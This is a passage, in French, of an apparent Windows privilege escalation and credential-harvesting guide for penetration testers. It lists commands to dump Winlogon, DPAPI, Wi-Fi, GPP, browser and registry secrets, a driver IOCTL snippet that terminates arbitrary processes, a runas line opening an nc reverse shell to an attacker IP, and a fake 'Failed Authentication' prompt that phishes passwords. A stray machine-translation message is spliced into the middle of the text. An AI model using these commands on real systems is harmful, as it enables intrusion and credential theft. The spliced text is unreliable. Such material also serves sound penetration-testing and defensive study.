HANDLE h = CreateFileA("\\\\.\\amsdk\\anyfile", GENERIC_READ|GENERIC_WRITE, 0, 0, OPEN_EXISTING, 0, 0);
DWORD me = GetCurrentProcessId();
DWORD target = /* PID to kill or open */;
DeviceIoControl(h, IOCTL_REGISTER_PROCESS,  &me,     sizeof(me),     0, 0, 0, 0);
DeviceIoControl(h, IOCTL_TERMINATE_PROCESS, &target, sizeof(target), 0, 0, 0, 0);
```
Mesures d'atténuation pour les développeurs
- Toujours définir FILE_DEVICE_SECURE_OPEN lors de la création d'objets de périphérique destinés à être restreints par un DACL.
- Valider le contexte de l'appelant pour les opérations privilégiées. Ajouter des vérifications PP/PPL avant d'autoriser la terminaison d'un processus ou le retour de handles.
- Restreindre les IOCTLs (access masks, METHOD_*, validation des entrées) et envisager des brokered models plutôt que des kernel privileges directs.

Idées de détection pour les défenseurs
- Surveiller les ouvertures en espace utilisateur des noms de périphérique suspects (p.ex., \\ .\\amsdk*) et les séquences IOCTL spécifiques indicatives d'un abus.
- Appliquer la blocklist de drivers vulnérables de Microsoft (HVCI/WDAC/Smart App Control) et maintenir vos propres listes d'autorisation/refus.


## PATH DLL Hijacking

Si vous avez **des permissions d'écriture dans un dossier présent dans PATH** vous pourriez être capable de détourner une DLL chargée par un processus et **escalate privileges**.

Vérifiez les permissions de tous les dossiers dans PATH:
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
Pour plus d'informations sur la manière d'abuser de cette vérification :

{{#ref}}
dll-hijacking/writable-sys-path-+dll-hijacking-privesc.md
{{#endref}}

## Réseau

### Partages
```bash
net view #Get a list of computers
net view /all /domain [domainname] #Shares on the domains
net view \\computer /ALL #List shares of a computer
net use x: \\computer\share #Mount the share locally
net share #Check current shares
```
### hosts file

Vérifiez la présence d'autres ordinateurs connus codés en dur dans le hosts file
```
type C:\Windows\System32\drivers\etc\hosts
```
### Interfaces réseau & DNS
```
ipconfig /all
Get-NetIPConfiguration | ft InterfaceAlias,InterfaceDescription,IPv4Address
Get-DnsClientServerAddress -AddressFamily IPv4 | ft
```
### Ports ouverts

Vérifier la présence de **services restreints** depuis l'extérieur
```bash
netstat -ano #Opened ports?
```
### Table de routage
```
route print
Get-NetRoute -AddressFamily IPv4 | ft DestinationPrefix,NextHop,RouteMetric,ifIndex
```
### Tableau ARP
```
arp -A
Get-NetNeighbor -AddressFamily IPv4 | ft ifIndex,IPAddress,L
```
### Règles du pare-feu

[**Check this page for Firewall related commands**](../basic-cmd-for-pentesters.md#firewall) **(lister les règles, créer des règles, désactiver, désactiver...)**

Plus[ commands for network enumeration here](../basic-cmd-for-pentesters.md#network)

### Windows Subsystem for Linux (wsl)
```bash
C:\Windows\System32\bash.exe
C:\Windows\System32\wsl.exe
```
Le binaire `bash.exe` peut également être trouvé dans `C:\Windows\WinSxS\amd64_microsoft-windows-lxssbash_[...]\bash.exe`

Si vous obtenez l'utilisateur root vous pouvez écouter sur n'importe quel port (la première fois que vous utilisez `nc.exe` pour écouter sur un port il demandera via GUI si `nc` doit être autorisé par le firewall).
```bash
wsl whoami
./ubuntun1604.exe config --default-user root
wsl whoami
wsl python -c 'BIND_OR_REVERSE_SHELL_PYTHON_CODE'
```
Pour démarrer facilement bash en tant que root, vous pouvez essayer `--default-user root`

Vous pouvez explorer le système de fichiers `WSL` dans le dossier `C:\Users\%USERNAME%\AppData\Local\Packages\CanonicalGroupLimited.UbuntuonWindows_79rhkp1fndgsc\LocalState\rootfs\`

## Identifiants Windows

### Identifiants Winlogon
```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr /i "DefaultDomainName DefaultUserName DefaultPassword AltDefaultDomainName AltDefaultUserName AltDefaultPassword LastUsedUsername"

#Other way
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultPassword
```
### Gestionnaire d'identifiants / Windows vault

Extrait de [https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault](https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault)\  
Le Windows Vault stocke les identifiants utilisateur pour les serveurs, sites web et autres programmes que **Windows** peut **connecter automatiquement les utilisateurs**. Au premier abord, cela pourrait donner l'impression que les utilisateurs peuvent y stocker leurs identifiants Facebook, Twitter, Gmail, etc., afin de se connecter automatiquement via les navigateurs. Mais ce n'est pas le cas.

Windows Vault stocke des identifiants que Windows peut utiliser pour connecter automatiquement les utilisateurs, ce qui signifie que toute **application Windows qui nécessite des identifiants pour accéder à une ressource** (serveur ou site web) **peut faire appel à ce Credential Manager** & Windows Vault et utiliser les identifiants fournis au lieu que l'utilisateur saisisse le nom d'utilisateur et le mot de passe à chaque fois.

À moins que les applications n'interagissent avec le Credential Manager, je ne pense pas qu'il soit possible pour elles d'utiliser les identifiants pour une ressource donnée. Donc, si votre application veut utiliser le vault, elle doit d'une manière ou d'une autre **communiquer avec le credential manager et demander les identifiants pour cette ressource** depuis le coffre de stockage par défaut.

Utilisez `cmdkey` pour lister les identifiants stockés sur la machine.
```bash
cmdkey /list
Currently stored credentials:
Target: Domain:interactive=WORKGROUP\Administrator
Type: Domain Password
User: WORKGROUP\Administrator
```
Vous pouvez alors utiliser `runas` avec l'option ` /savecred` pour utiliser les informations d'identification enregistrées. L'exemple suivant appelle un binaire distant via un partage SMB.
```bash
runas /savecred /user:WORKGROUP\Administrator "\\10.XXX.XXX.XXX\SHARE\evil.exe"
```
Utilisation de `runas` avec un ensemble de credential fourni.
```bash
C:\Windows\System32\runas.exe /env /noprofile /user:<username> <password> "c:\users\Public\nc.exe -nc <attacker-ip> 4444 -e cmd.exe"
```
Notez que mimikatz, lazagne, [credentialfileview](https://www.nirsoft.net/utils/credentials_file_view.html), [VaultPasswordView](https://www.nirsoft.net/utils/vault_password_view.html), ou depuis [Empire Powershells module](https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/dumpCredStore.ps1).

### DPAPI

La **Data Protection API (DPAPI)** fournit une méthode pour le chiffrement symétrique des données, principalement utilisée au sein du système d'exploitation Windows pour le chiffrement symétrique des clés privées asymétriques. Ce chiffrement s'appuie sur un secret utilisateur ou système qui contribue significativement à l'entropie.

**DPAPI permet le chiffrement des clés via une clé symétrique dérivée des secrets de connexion de l'utilisateur**. Dans les scénarios d'encryption système, il utilise les secrets d'authentification de domaine du système.

Les clés RSA utilisateur chiffrées, utilisant DPAPI, sont stockées dans le répertoire %APPDATA%\Microsoft\Protect\{SID}, où {SID} représente le [Security Identifier](https://en.wikipedia.org/wiki/Security_Identifier). **La clé DPAPI, colocée avec la clé principale qui protège les clés privées de l'utilisateur dans le même fichier**, se compose typiquement de 64 octets de données aléatoires. (Il est important de noter que l'accès à ce répertoire est restreint, empêchant d'en lister le contenu via la commande dir dans CMD, bien qu'il puisse être listé via PowerShell).
```bash
Get-ChildItem  C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem  C:\Users\USER\AppData\Local\Microsoft\Protect\
```
Vous pouvez utiliser le **mimikatz module** `dpapi::masterkey` avec les arguments appropriés (`/pvk` ou `/rpc`) pour le déchiffrer.

Les **credentials files protected by the master password** se trouvent généralement dans :
```bash
dir C:\Users\username\AppData\Local\Microsoft\Credentials\
dir C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```
Vous pouvez utiliser **mimikatz module** `dpapi::cred` avec le `/masterkey` approprié pour déchiffrer.\
Vous pouvez **extract many DPAPI** **masterkeys** from **memory** avec le module `sekurlsa::dpapi` (si vous êtes root).


{{#ref}}
dpapi-extracting-passwords.md
{{#endref}}

### PowerShell Credentials

Les **PowerShell credentials** sont souvent utilisées pour des tâches de **scripting** et d'automatisation, afin de stocker des identifiants chiffrés de manière pratique. Les identifiants sont protégés par **DPAPI**, ce qui signifie généralement qu'ils ne peuvent être déchiffrés que par le même utilisateur sur le même ordinateur où ils ont été créés.

Pour **déchiffrer** des PS credentials à partir du fichier qui les contient, vous pouvez faire :
```bash
PS C:\> $credential = Import-Clixml -Path 'C:\pass.xml'
PS C:\> $credential.GetNetworkCredential().username

john

PS C:\htb> $credential.GetNetworkCredential().password

JustAPWD!
```
### Wi-Fi
```bash
#List saved Wifi using
netsh wlan show profile
#To get the clear-text password use
netsh wlan show profile <SSID> key=clear
#Oneliner to extract all wifi passwords
cls & echo. & for /f "tokens=3,* delims=: " %a in ('netsh wlan show profiles ^| find "Profile "') do @echo off > nul & (netsh wlan show profiles name="%b" key=clear | findstr "SSID Cipher Content" | find /v "Number" & echo.) & @echo on*
```
### Connexions RDP enregistrées

Vous pouvez les trouver dans `HKEY_USERS\<SID>\Software\Microsoft\Terminal Server Client\Servers\`\
et dans `HKCU\Software\Microsoft\Terminal Server Client\Servers\`

### Commandes récemment exécutées
```
HCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
HKCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
```
### **Gestionnaire d'identifiants de Bureau à distance**
```
%localappdata%\Microsoft\Remote Desktop Connection Manager\RDCMan.settings
```
Utilisez le module **Mimikatz** `dpapi::rdg` avec le `/masterkey` approprié pour **décrypter n'importe quels fichiers .rdg`\
Vous pouvez **extraire de nombreux DPAPI masterkeys** de la mémoire avec le module Mimikatz `sekurlsa::dpapi`

### Sticky Notes

Les utilisateurs utilisent souvent l'application StickyNotes sur des postes de travail Windows pour **enregistrer des mots de passe** et d'autres informations, sans se rendre compte qu'il s'agit d'un fichier de base de données. Ce fichier se trouve à `C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite` et vaut toujours la peine d'être recherché et examiné.

### AppCmd.exe

**Notez que pour récupérer des mots de passe depuis AppCmd.exe vous devez être Administrateur et l'exécuter sous un High Integrity level.**\
**AppCmd.exe** se trouve dans le répertoire `%systemroot%\system32\inetsrv\`.\  
Si ce fichier existe, il est possible que des **credentials** aient été configurés et puissent être **récupérés**.

Ce code a été extrait de [**PowerUP**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1):
```bash
function Get-ApplicationHost {
$OrigError = $ErrorActionPreference
$ErrorActionPreference = "SilentlyContinue"

# Check if appcmd.exe exists
if (Test-Path  ("$Env:SystemRoot\System32\inetsrv\appcmd.exe")) {
# Create data table to house results
$DataTable = New-Object System.Data.DataTable

# Create and name columns in the data table
$Null = $DataTable.Columns.Add("user")
$Null = $DataTable.Columns.Add("pass")
$Null = $DataTable.Columns.Add("type")
$Null = $DataTable.Columns.Add("vdir")
$Null = $DataTable.Columns.Add("apppool")

# Get list of application pools
Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppools /text:name" | ForEach-Object {

# Get application pool name
$PoolName = $_

# Get username
$PoolUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.username"
$PoolUser = Invoke-Expression $PoolUserCmd

# Get password
$PoolPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.password"
$PoolPassword = Invoke-Expression $PoolPasswordCmd

# Check if credentials exists
if (($PoolPassword -ne "") -and ($PoolPassword -isnot [system.array])) {
# Add credentials to database
$Null = $DataTable.Rows.Add($PoolUser, $PoolPassword,'Application Pool','NA',$PoolName)
}
}

# Get list of virtual directories
Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir /text:vdir.name" | ForEach-Object {

# Get Virtual Directory Name
$VdirName = $_

# Get username
$VdirUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:userName"
$VdirUser = Invoke-Expression $VdirUserCmd

# Get password
$VdirPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:password"
$VdirPassword = Invoke-Expression $VdirPasswordCmd

# Check if credentials exists
if (($VdirPassword -ne "") -and ($VdirPassword -isnot [system.array])) {
# Add credentials to database
$Null = $DataTable.Rows.Add($VdirUser, $VdirPassword,'Virtual Directory',$VdirName,'NA')
}
}

# Check if any passwords were found
if( $DataTable.rows.Count -gt 0 ) {
# Display results in list view that can feed into the pipeline
$DataTable |  Sort-Object type,user,pass,vdir,apppool | Select-Object user,pass,type,vdir,apppool -Unique
}
else {
# Status user
Write-Verbose 'No application pool or virtual directory passwords were found.'
$False
}
}
else {
Write-Verbose 'Appcmd.exe does not exist in the default location.'
$False
}
$ErrorActionPreference = $OrigError
}
```
### SCClient / SCCM

Vérifier si `C:\Windows\CCM\SCClient.exe` existe .\
Les installateurs sont **exécutés avec les privilèges SYSTEM**, beaucoup sont vulnérables à **DLL Sideloading (Info from** [**https://github.com/enjoiz/Privesc**](https://github.com/enjoiz/Privesc)**).**
```bash
$result = Get-WmiObject -Namespace "root\ccm\clientSDK" -Class CCM_Application -Property * | select Name,SoftwareVersion
if ($result) { $result }
else { Write "Not Installed." }
```
## Fichiers et Registre (Identifiants)

### Putty Creds
```bash
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s | findstr "HKEY_CURRENT_USER HostName PortNumber UserName PublicKeyFile PortForwardings ConnectionSharing ProxyPassword ProxyUsername" #Check the values saved in each session, user/password could be there
```
### Clés d'hôte SSH de Putty
```
reg query HKCU\Software\SimonTatham\PuTTY\SshHostKeys\
```
### SSH keys dans le registre

Des SSH private keys peuvent être stockées dans la clé de registre `HKCU\Software\OpenSSH\Agent\Keys`, vous devriez donc vérifier s'il y a quelque chose d'intéressant :
```bash
reg query 'HKEY_CURRENT_USER\Software\OpenSSH\Agent\Keys'
```
Si vous trouvez une entrée dans ce chemin, il s'agira probablement d'une clé SSH sauvegardée. Elle est stockée chiffrée mais peut être facilement déchiffrée en utilisant [https://github.com/ropnop/windows_sshagent_extract](https://github.com/ropnop/windows_sshagent_extract).\
Plus d'informations sur cette technique ici : [https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

Si le service `ssh-agent` n'est pas en cours d'exécution et que vous souhaitez qu'il démarre automatiquement au démarrage, exécutez :
```bash
Get-Service ssh-agent | Set-Service -StartupType Automatic -PassThru | Start-Service
```
> [!TIP]
> Il semble que cette technique ne soit plus valide. J'ai essayé de créer des ssh keys, de les ajouter avec `ssh-add` et de me connecter via ssh à une machine. La clé de registre HKCU\Software\OpenSSH\Agent\Keys n'existe pas et procmon n'a pas identifié l'utilisation de `dpapi.dll` pendant l'authentification par clé asymétrique.
    
### Fichiers non surveillés
```
C:\Windows\sysprep\sysprep.xml
C:\Windows\sysprep\sysprep.inf
C:\Windows\sysprep.inf
C:\Windows\Panther\Unattended.xml
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\Panther\Unattend\Unattended.xml
C:\Windows\System32\Sysprep\unattend.xml
C:\Windows\System32\Sysprep\unattended.xml
C:\unattend.txt
C:\unattend.inf
dir /s *sysprep.inf *sysprep.xml *unattended.xml *unattend.xml *unattend.txt 2>nul
```
Vous pouvez également rechercher ces fichiers en utilisant **metasploit**: _post/windows/gather/enum_unattend_

Exemple de contenu:
```xml
<component name="Microsoft-Windows-Shell-Setup" publicKeyToken="31bf3856ad364e35" language="neutral" versionScope="nonSxS" processorArchitecture="amd64">
<AutoLogon>
<Password>U2VjcmV0U2VjdXJlUGFzc3dvcmQxMjM0Kgo==</Password>
<Enabled>true</Enabled>
<Username>Administrateur</Username>
</AutoLogon>

<UserAccounts>
<LocalAccounts>
<LocalAccount wcm:action="add">
<Password>*SENSITIVE*DATA*DELETED*</Password>
<Group>administrators;users</Group>
<Name>Administrateur</Name>
</LocalAccount>
</LocalAccounts>
</UserAccounts>
```
### Sauvegardes SAM & SYSTEM
```bash
# Usually %SYSTEMROOT% = C:\Windows
%SYSTEMROOT%\repair\SAM
%SYSTEMROOT%\System32\config\RegBack\SAM
%SYSTEMROOT%\System32\config\SAM
%SYSTEMROOT%\repair\system
%SYSTEMROOT%\System32\config\SYSTEM
%SYSTEMROOT%\System32\config\RegBack\system
```
### Identifiants Cloud
```bash
#From user home
.aws\credentials
AppData\Roaming\gcloud\credentials.db
AppData\Roaming\gcloud\legacy_credentials
AppData\Roaming\gcloud\access_tokens.db
.azure\accessTokens.json
.azure\azureProfile.json
```
### McAfee SiteList.xml

Recherchez un fichier appelé **SiteList.xml**

### Mot de passe GPP mis en cache

Une fonctionnalité permettait auparavant le déploiement de comptes administrateurs locaux personnalisés sur un groupe de machines via Group Policy Preferences (GPP). Cependant, cette méthode présentait d'importantes failles de sécurité. Premièrement, les Group Policy Objects (GPOs), stockés sous forme de fichiers XML dans SYSVOL, pouvaient être consultés par n'importe quel utilisateur du domaine. Deuxièmement, les mots de passe contenus dans ces GPP, chiffrés avec AES256 en utilisant une clé par défaut documentée publiquement, pouvaient être décryptés par tout utilisateur authentifié. Cela constituait un risque sérieux, car cela pouvait permettre à des utilisateurs d'obtenir des privilèges élevés.

Pour atténuer ce risque, une fonction a été développée pour analyser les fichiers GPP mis en cache localement contenant un champ "cpassword" non vide. Lorsqu'elle trouve un tel fichier, la fonction décrypte le mot de passe et retourne un objet PowerShell personnalisé. Cet objet inclut des détails sur le GPP et l'emplacement du fichier, aidant à l'identification et à la correction de cette vulnérabilité de sécurité.

Recherchez dans `C:\ProgramData\Microsoft\Group Policy\history` ou dans _**C:\Documents and Settings\All Users\Application Data\Microsoft\Group Policy\history** (avant W Vista)_ ces fichiers :

- Groups.xml
- Services.xml
- Scheduledtasks.xml
- DataSources.xml
- Printers.xml
- Drives.xml

**Pour décrypter le cPassword :**
```bash
#To decrypt these passwords you can decrypt it using
gpp-decrypt j1Uyj3Vx8TY9LtLZil2uAuZkFQA/4latT76ZwgdHdhw
```
Utiliser crackmapexec pour obtenir les passwords :
```bash
crackmapexec smb 10.10.10.10 -u username -p pwd -M gpp_autologin
```
### Configuration Web IIS
```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```

```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
C:\inetpub\wwwroot\web.config
```

```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
Get-Childitem –Path C:\xampp\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```
Exemple de web.config avec credentials :
```xml
<authentication mode="Forms">
<forms name="login" loginUrl="/admin">
<credentials passwordFormat = "Clear">
<user name="Administrator" password="SuperAdminPassword" />
</credentials>
</forms>
</authentication>
```
### OpenVPN identifiants
```csharp
Add-Type -AssemblyName System.Security
$keys = Get-ChildItem "HKCU:\Software\OpenVPN-GUI\configs"
$items = $keys | ForEach-Object {Get-ItemProperty $_.PsPath}

foreach ($item in $items)
{
$encryptedbytes=$item.'auth-data'
$entropy=$item.'entropy'
$entropy=$entropy[0..(($entropy.Length)-2)]

$decryptedbytes = [System.Security.Cryptography.ProtectedData]::Unprotect(
$encryptedBytes,
$entropy,
[System.Security.Cryptography.DataProtectionScope]::CurrentUser)

Write-Host ([System.Text.Encoding]::Unicode.GetString($decryptedbytes))
}
```
### Journaux
```bash
# IIS
C:\inetpub\logs\LogFiles\*

#Apache
Get-Childitem –Path C:\ -Include access.log,error.log -File -Recurse -ErrorAction SilentlyContinue
```
### Demander des credentials

Vous pouvez toujours **demander à l'utilisateur de saisir ses credentials ou même les credentials d'un autre utilisateur** si vous pensez qu'il peut les connaître (notez que **demander** directement au client les **credentials** est vraiment **risqué**):
```bash
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+[Environment]::UserName,[Environment]::UserDomainName); $cred.getnetworkcredential().password
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+'anotherusername',[Environment]::UserDomainName); $cred.getnetworkcredential().password

#Get plaintext
$cred.GetNetworkCredential() | fl
```
### **Noms de fichiers pouvant contenir des identifiants**

Fichiers connus qui, il y a quelque temps, contenaient des **mots de passe** en **texte en clair** ou en **Base64**
```bash
$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history
vnc.ini, ultravnc.ini, *vnc*
web.config
php.ini httpd.conf httpd-xampp.conf my.ini my.cnf (XAMPP, Apache, PHP)
SiteList.xml #McAfee
ConsoleHost_history.txt #PS-History
*.gpg
*.pgp
*config*.php
elasticsearch.y*ml
kibana.y*ml
*.p12
*.der
*.csr
*.cer
known_hosts
id_rsa
id_dsa
*.ovpn
anaconda-ks.cfg
hostapd.conf
rsyncd.conf
cesi.conf
supervisord.conf
tomcat-users.xml
*.kdbx
KeePass.config
Ntds.dit
SAM
SYSTEM
FreeSSHDservice.ini
access.log
error.log
server.xml
ConsoleHost_history.txt
setupinfo
setupinfo.bak
key3.db         #Firefox
key4.db         #Firefox
places.sqlite   #Firefox
"Login Data"    #Chrome
Cookies         #Chrome
Bookmarks       #Chrome
History         #Chrome
TypedURLsTime   #IE
TypedURLs       #IE
%SYSTEMDRIVE%\pagefile.sys
%WINDIR%\debug\NetSetup.log
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software, %WINDIR%\repair\security
%WINDIR%\iis6.log
%WINDIR%\system32\config\AppEvent.Evt
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\CCM\logs\*.log
%USERPROFILE%\ntuser.dat
%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
```
Je n'ai pas reçu le contenu du fichier src/windows-hardening/windows-local-privilege-escalation/README.md. Veuillez fournir le contenu à traduire ou préciser les fichiers à rechercher afin que je puisse effectuer la traduction en français.
```
cd C:\
dir /s/b /A:-D RDCMan.settings == *.rdg == *_history* == httpd.conf == .htpasswd == .gitconfig == .git-credentials == Dockerfile == docker-compose.yml == access_tokens.db == accessTokens.json == azureProfile.json == appcmd.exe == scclient.exe == *.gpg$ == *.pgp$ == *config*.php == elasticsearch.y*ml == kibana.y*ml == *.p12$ == *.cer$ == known_hosts == *id_rsa* == *id_dsa* == *.ovpn == tomcat-users.xml == web.config == *.kdbx == KeePass.config == Ntds.dit == SAM == SYSTEM == security == software == FreeSSHDservice.ini == sysprep.inf == sysprep.xml == *vnc*.ini == *vnc*.c*nf* == *vnc*.txt == *vnc*.xml == php.ini == https.conf == https-xampp.conf == my.ini == my.cnf == access.log == error.log == server.xml == ConsoleHost_history.txt == pagefile.sys == NetSetup.log == iis6.log == AppEvent.Evt == SecEvent.Evt == default.sav == security.sav == software.sav == system.sav == ntuser.dat == index.dat == bash.exe == wsl.exe 2>nul | findstr /v ".dll"
```

```
Get-Childitem –Path C:\ -Include *unattend*,*sysprep* -File -Recurse -ErrorAction SilentlyContinue | where {($_.Name -like "*.xml" -or $_.Name -like "*.txt" -or $_.Name -like "*.ini")}
```
### Identifiants dans la Corbeille

Vous devriez également vérifier la Corbeille pour y rechercher des identifiants

Pour **récupérer des mots de passe** enregistrés par plusieurs programmes vous pouvez utiliser : [http://www.nirsoft.net/password_recovery_tools.html](http://www.nirsoft.net/password_recovery_tools.html)

### Dans le registre

**Autres clés de registre possibles contenant des identifiants**
```bash
reg query "HKCU\Software\ORL\WinVNC3\Password"
reg query "HKLM\SYSTEM\CurrentControlSet\Services\SNMP" /s
reg query "HKCU\Software\TightVNC\Server"
reg query "HKCU\Software\OpenSSH\Agent\Key"
```
[**Extract openssh keys from registry.**](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

### Historique des navigateurs

Vous devriez vérifier les bases de données (dbs) où sont stockés les mots de passe de **Chrome or Firefox**.\
Vérifiez aussi l'historique, les signets et les favoris des navigateurs, car certains **mots de passe** peuvent y être stockés.

Outils pour extraire les mots de passe des navigateurs :

- Mimikatz: `dpapi::chrome`
- [**SharpWeb**](https://github.com/djhohnstein/SharpWeb)
- [**SharpChromium**](https://github.com/djhohnstein/SharpChromium)
- [**SharpDPAPI**](https://github.com/GhostPack/SharpDPAPI)

### **COM DLL Overwriting**

**Component Object Model (COM)** est une technologie intégrée au système d'exploitation Windows qui permet l'**intercommunication** entre composants logiciels écrits dans différents langages. Chaque composant COM est **identifié via un class ID (CLSID)** et expose des fonctionnalités via une ou plusieurs interfaces, identifiées via des interface IDs (IIDs).

Les classes et interfaces COM sont définies dans le registre sous **HKEY\CLASSES\ROOT\CLSID** et **HKEY\CLASSES\ROOT\Interface** respectivement. Ce registre est créé en fusionnant **HKEY\LOCAL\MACHINE\Software\Classes** + **HKEY\CURRENT\USER\Software\Classes** = **HKEY\CLASSES\ROOT.**

À l'intérieur des CLSID de ce registre, vous pouvez trouver la clé enfant **InProcServer32** qui contient une **valeur par défaut** pointant vers une **DLL** et une valeur appelée **ThreadingModel** qui peut être **Apartment** (Single-Threaded), **Free** (Multi-Threaded), **Both** (Single or Multi) or **Neutral** (Thread Neutral).

![](<../../images/image (729).png>)

En pratique, si vous pouvez **overwrite any of the DLLs** qui vont être exécutées, vous pourriez **escalate privileges** si cette DLL est exécutée par un autre utilisateur.

Pour savoir comment les attaquants utilisent le COM Hijacking comme mécanisme de persistence, consultez :


{{#ref}}
com-hijacking.md
{{#endref}}

### **Generic Password search in files and registry**

**Rechercher le contenu des fichiers**
```bash
cd C:\ & findstr /SI /M "password" *.xml *.ini *.txt
findstr /si password *.xml *.ini *.txt *.config
findstr /spin "password" *.*
```
**Rechercher un fichier avec un nom de fichier spécifique**
```bash
dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*
where /R C:\ user.txt
where /R C:\ *.ini
```
**Rechercher dans le registry des key names et des passwords**
```bash
REG QUERY HKLM /F "password" /t REG_SZ /S /K
REG QUERY HKCU /F "password" /t REG_SZ /S /K
REG QUERY HKLM /F "password" /t REG_SZ /S /d
REG QUERY HKCU /F "password" /t REG_SZ /S /d
```
### Outils qui recherchent des passwords

[**MSF-Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **est un plugin msf** que j'ai créé pour **exécuter automatiquement chaque module POST de metasploit qui recherche des credentials** sur la victime.\
[**Winpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) recherche automatiquement tous les fichiers contenant des passwords mentionnés dans cette page.\
[**Lazagne**](https://github.com/AlessandroZ/LaZagne) est un autre excellent outil pour extraire des passwords d'un système.

L'outil [**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) recherche des **sessions**, des **usernames** et des **passwords** de plusieurs outils qui enregistrent ces données en clair (PuTTY, WinSCP, FileZilla, SuperPuTTY, et RDP)
```bash
Import-Module path\to\SessionGopher.ps1;
Invoke-SessionGopher -Thorough
Invoke-SessionGopher -AllDomain -o
Invoke-SessionGopher -AllDomain -u domain.com\adm-arvanaghi -p s3cr3tP@ss
```
## Leaked Handlers

Imaginez qu'**un processus s'exécutant en tant que SYSTEM ouvre un nouveau processus** (`OpenProcess()`) avec **un accès complet**. Le même processus **crée également un nouveau processus** (`CreateProcess()`) **avec de faibles privilèges mais héritant de tous les handles ouverts du processus principal**.\
Ensuite, si vous avez **un accès complet au processus faiblement privilégié**, vous pouvez récupérer le **handle ouvert vers le processus privilégié créé** avec `OpenProcess()` et **injecter un shellcode**.\
[Read this example for more information about **how to detect and exploit this vulnerability**.](leaked-handle-exploitation.md)\
[Read this **other post for a more complete explanation on how to test and abuse more open handlers of processes and threads inherited with different levels of permissions (not only full access)**](http://dronesec.pw/blog/2019/08/22/exploiting-leaked-process-and-thread-handles/).

## Named Pipe Client Impersonation

Les segments de mémoire partagée, appelés **pipes**, permettent la communication entre processus et le transfert de données.

Windows fournit une fonctionnalité appelée **Named Pipes**, permettant à des processus non liés de partager des données, même sur des réseaux différents. Cela ressemble à une architecture client/serveur, avec des rôles définis comme **named pipe server** et **named pipe client**.

Lorsqu'un **client** envoie des données via un pipe, le **serveur** qui a créé le pipe a la capacité de **prendre l'identité** du **client**, à condition qu'il dispose des droits **SeImpersonate** nécessaires. Identifier un **processus privilégié** qui communique via un pipe que vous pouvez imiter offre une opportunité d'**obtenir des privilèges supérieurs** en adoptant l'identité de ce processus lorsqu'il interagit avec le pipe que vous avez établi. Pour des instructions sur l'exécution d'une telle attaque, des guides utiles se trouvent [**ici**](named-pipe-client-impersonation.md) et [**ici**](#from-high-integrity-to-system).

De plus, l'outil suivant permet d'**intercepter une communication de named pipe avec un outil comme burp :** [**https://github.com/gabriel-sztejnworcel/pipe-intercept**](https://github.com/gabriel-sztejnworcel/pipe-intercept) **et cet outil permet de lister et voir tous les pipes pour trouver des privescs** [**https://github.com/cyberark/PipeViewer**](https://github.com/cyberark/PipeViewer)

## Divers

